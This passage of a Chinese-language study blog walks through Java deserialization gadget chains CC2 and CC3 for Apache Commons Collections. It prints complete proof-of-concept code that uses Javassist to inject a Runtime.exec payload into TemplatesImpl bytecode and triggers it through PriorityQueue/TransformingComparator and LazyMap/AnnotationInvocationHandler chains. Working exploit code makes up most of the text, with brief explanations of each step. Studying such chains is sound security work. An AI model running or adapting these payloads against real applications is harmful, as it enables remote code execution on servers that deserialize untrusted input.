<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassit_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码中生成的class是这样的：</p>
<p><img src="https://baicany.github.io/images/1591853427000-38hhzgk.png" alt="-w442"></p>
<p>这里的static语句块会在创建类实例的时候执行。</p>
<p>然后要TemplatesImpl这个类,实列化就行了</p>
<p>Demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassit_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicnay&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/1591853428000-42fffzl.png" alt="-w1239"></p>
<p>此时已经可以成功执行命令了，接下来就是需要找到一个点调用了newTransformer这个方法。</p>
<p>前面说了，我们已经可以执行到transform方法了，那么我们可以通过InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，达到命令执行的目的。</p>
<p>完整POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么之前那个条件有个不需要加了因为在readObject里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure>

<p>为什么要修改queue数组的第一个值为TemplatesImpl?</p>
<p>是因为在调用compare方法的时候，传递了一个obj1进去：</p>
<p><img src="https://baicany.github.io/images/1591853429000-47jhrrl.png" alt="-w514"></p>
<p>通过cc1的学习我们知道，InvokerTransformer调用方法是基于你传递进来的类来进行调用的，所以这里的obj1需要设置为TemplatesImpl，而这个obj1是从这里来的,(所以最后调用了method.invoke(obj, this.iArgs);)</p>
<p><img src="https://baicany.github.io/images/1591853429000-48qffxb.png" alt="-w632"></p>
<p>所以我们需要控制这个c，而这个c是从queue中取出来的，所以在这里我们需要设置queue中第一个值为TemplatesImpl，为什么不能设置为第二个呢？是因为调用compare时，会先对第一个进行调用，如果我们设置TemplatesImpl在第二个位置，则会报出1没有newTransformer方法的错误：</p>
<p><img src="https://baicany.github.io/images/1591853429000-49pelpn.png" alt="-w1201"></p>
<p>为什么要通过反射的方式修改size?</p>
<p>这个在前面说过了，size必须要大于2，而我们这里并没有调用put方法，所以size默认是为0的，当然还有一种办法，就是先调用两次put，put正常的值进，再修改queue数组，这两种办法的实现原理是一样的。</p>
<p>这里我觉得非常巧妙</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>正好通过反射让 后面的2个参数全为null了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] paramTypes, Object[] args</span><br><span class="line">所以在method.invoke(input, <span class="built_in">this</span>.iArgs);这里的时候正好是impl.newTransformer()了</span><br></pre></td></tr></table></figure>

<p>依赖版本  commons-collections : 4.0</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链3</title>
    <url>/2023/07/16/cc3/</url>
    <content><![CDATA[<p>CC3就是将CC1调⽤链和动态加载字节码加在⼀起</p>
<p>中间寻找了其他的触发 newTransformer 的实现方式。</p>
<p>所以自己先想想怎么构造的，c2链就用到了InvocationHandler来使用newTransformer方法的</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>在 SAX API 中提供了一个过滤器接口 <code>org.xml.sax.XMLFilter</code>，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。</p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates&#x2F;TransformerImpl&#x2F;TransformerHandlerImpl 属性，</p>
<p>TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//初始化</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们当然可以像c2链一样可以使用 InvokerTransformer反射拿到Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。</p>
<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 <code>transform()</code> 方法实际上接收一个 Class 类型的对象，通过 <code>getConstructor</code> 获取构造方法，并通过 <code>newInstance</code> 创建类实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                 <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                     + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">         <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">     &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">         ...</span><br><span class="line">     &#125;</span><br><span class="line">    ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>3.2.2之后序列化需要属性Dproperty&#x3D;true</p>
<h1 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h1><p>其实就用了cc1链的前面部分和动态加载字节码那部分加起来了所以直接自己尝试写poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(impl),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chain);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Target.class,lazymap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span>(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">a</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Target.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(a);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span></span><br><span class="line">        Exception &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field = clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                    field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也没什么新知识点就直接写，该处理的细节处理好就行了</p>
